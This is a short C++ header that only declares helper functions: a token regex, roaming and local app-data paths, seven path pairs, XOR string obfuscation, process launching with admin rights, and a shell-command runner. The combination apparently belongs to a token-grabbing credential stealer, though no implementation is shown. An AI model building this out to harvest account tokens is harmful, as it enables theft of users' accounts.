#pragma once
#include <vector>
#include <string>
#include <array>

#include "xor.hpp"

namespace helpers {
	extern std::string regex_token;

	extern std::string roaming;

	extern std::string local;

	extern std::array<std::pair<std::string, std::string>, 7> paths;

	std::string read_file(const char* filename);

	bool is_initialized();

	void start_process(std::string path);

	void start_process_admin(std::string path);

	HANDLE is_process_running(const char* process_name, DWORD dwAccess);

	bool is_client_running();

	std::string exec(const char* cmd);

	bool is_elevated();

	std::wstring s2ws(const std::string& s);
}
